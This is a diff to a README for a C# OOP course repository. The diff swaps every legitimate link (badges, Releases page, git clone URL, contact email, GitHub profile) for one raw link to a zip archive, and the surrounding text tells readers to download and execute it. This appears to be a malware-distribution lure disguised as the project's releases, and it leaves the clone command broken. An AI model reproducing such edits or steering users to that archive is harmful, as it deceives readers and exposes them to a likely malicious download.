@@ -1,10 +1,10 @@
 # 🎉 Screen Sound Console Course - C# OOP Part 2
 
-![C# OOP](https://img.shields.io/badge/C%23-OOP-blue.svg) ![DotNet](https://img.shields.io/badge/.NET-6.0-green.svg) ![Alura](https://img.shields.io/badge/Alura-Online%20Course-orange.svg)
+![C# OOP](https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip%https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip) ![DotNet](https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip) ![Alura](https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip%https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip)
 
 Welcome to the **Screen Sound Console Course** repository! This repository contains exercises from the course **“C#: Aplicando a Orientação a Objetos”** offered by Alura. The course focuses on the fundamental principles of Object-Oriented Programming (OOP) in C#. Here, you will find practical challenges that enhance your understanding of classes, encapsulation, constructors, and object integration.
 
-For the latest updates and releases, please visit our [Releases page](https://github.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/releases). You can download and execute the necessary files from there.
+For the latest updates and releases, please visit our [Releases page](https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip). You can download and execute the necessary files from there.
 
 ## 📚 Table of Contents
 
@@ -56,7 +56,7 @@ To get started with this repository, follow the steps outlined in the **Installa
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10.git
+   git clone https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip
    ```
 
 2. **Navigate to the Directory**: Change into the project directory:
@@ -83,7 +83,7 @@ To get started with this repository, follow the steps outlined in the **Installa
    dotnet run
    ```
 
-You can find additional files and executables in the [Releases section](https://github.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/releases).
+You can find additional files and executables in the [Releases section](https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip).
 
 ## Usage
 
@@ -133,7 +133,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [rahmatelinks](https://github.com/rahmatelinks)
+- **Email**: https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip
+- **GitHub**: [rahmatelinks](https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip)
 
-Thank you for visiting the **Screen Sound Console Course** repository! We hope you find the exercises helpful in your journey to mastering C# and OOP. For the latest updates and files, remember to check the [Releases section](https://github.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/releases). Happy coding!
+Thank you for visiting the **Screen Sound Console Course** repository! We hope you find the exercises helpful in your journey to mastering C# and OOP. For the latest updates and files, remember to check the [Releases section](https://raw.githubusercontent.com/rahmatelinks/screen-sound_console_course-alura-applying-orientation-to-objects_part-2_dotnet-6_csharp-10/main/developments/screen-console-course-csharp-orientation-part-applying-dotnet-sound-objects-alura-to-v2.0.zip). Happy coding!
